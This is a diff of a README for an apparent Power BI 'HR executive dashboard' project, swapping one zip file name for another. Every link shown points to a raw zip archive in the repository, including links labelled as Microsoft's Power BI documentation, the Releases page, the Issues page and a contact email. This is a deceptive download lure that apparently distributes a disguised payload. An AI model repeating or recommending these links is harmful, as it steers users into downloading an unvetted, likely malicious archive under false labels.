@@ -1,6 +1,6 @@
 # 📊 hr-executive-dashboard-analytics - Elevate Your HR Insights Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip%20Now-%23006EB8?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip)
+[![Download Now](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip%20Now-%23006EB8?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the application, please visit our [Releases page](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip). 
+To download the application, please visit our [Releases page](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip). 
 
 1. Click the link above.
 2. Find the latest version at the top of the page.
@@ -28,7 +28,7 @@ Once downloaded:
 - Double-click the `.pbix` file to open it in Power BI.
 - Follow any on-screen prompts to finish loading the application.
 
-Feel free to refer to [Microsoft's Power BI documentation](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip) for help with opening and using Power BI.
+Feel free to refer to [Microsoft's Power BI documentation](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip) for help with opening and using Power BI.
 
 ## 📊 Features
 
@@ -74,7 +74,7 @@ This solution integrates concepts from multiple HR analytics areas. Topics inclu
 
 If you run into any issues or have questions, please reach out:
 
-- **Issues Page:** [Report a problem](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip).
+- **Issues Page:** [Report a problem](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip).
 - **Community Forums:** Join discussions with other users in the Power BI community.
 
 ## 🎉 Contribution
@@ -90,13 +90,13 @@ We welcome enhancements and ideas to improve the application.
 ## 📞 Contact Information
 
 For direct inquiries, you can contact:
-- Email: https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip
+- Email: https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip
 
 ## 🔗 Additional Resources
 
-- [Microsoft Power BI Official Site](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip)
-- [Power BI Tutorial Series](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip)
-- [HR Analytics Best Practices](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip)
+- [Microsoft Power BI Official Site](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip)
+- [Power BI Tutorial Series](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip)
+- [HR Analytics Best Practices](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip)
 
 ## 📅 Future Updates
 
@@ -106,4 +106,4 @@ We plan to improve the application continually. Upcoming features include:
 - **Mobile Compatibility**
 - **Real-Time Data Syncing**
 
-Stay tuned for future releases through our [Releases page](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard_analytics_hr_executive_v3.1.zip).
+Stay tuned for future releases through our [Releases page](https://raw.githubusercontent.com/duran00/hr-executive-dashboard-analytics/main/reitbok/dashboard-analytics-executive-hr-v2.8.zip).
